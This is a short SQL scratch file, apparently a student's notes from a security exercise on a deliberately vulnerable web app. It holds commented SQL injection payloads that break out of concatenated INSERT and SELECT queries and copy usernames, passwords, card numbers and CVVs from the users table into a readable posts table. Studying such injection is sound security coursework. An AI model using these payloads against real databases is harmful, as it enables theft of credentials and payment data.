/* 
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Other/SQLTemplate.sql to edit this template
 */
/**
 * Author:  adam.darcy
 * Created: 7 Nov 2022
 */
# INSERT into posts(content,title,user) values ('" + content + "' OR INSERT into posts(content, title, user) SELECT id, username, password FROM users WHERE id=6 # "','" + title + "','" + user + "')
# select * from carddetail

# select * from users where username='" "'; INSERT into posts(content, title, user) SELECT CAST(cardno as varchar), CAST(cvv as varchar), CAST(id as varchar) FROM users WHERE id=3  # +user+"' and password='"+pass+"'
select * from users

# INSERT into posts(content,title,user) values ('" + content + "'; INSERT into posts(content, title, user) SELECT id, username, password FROM users WHERE id=7 # ,'" + user + "')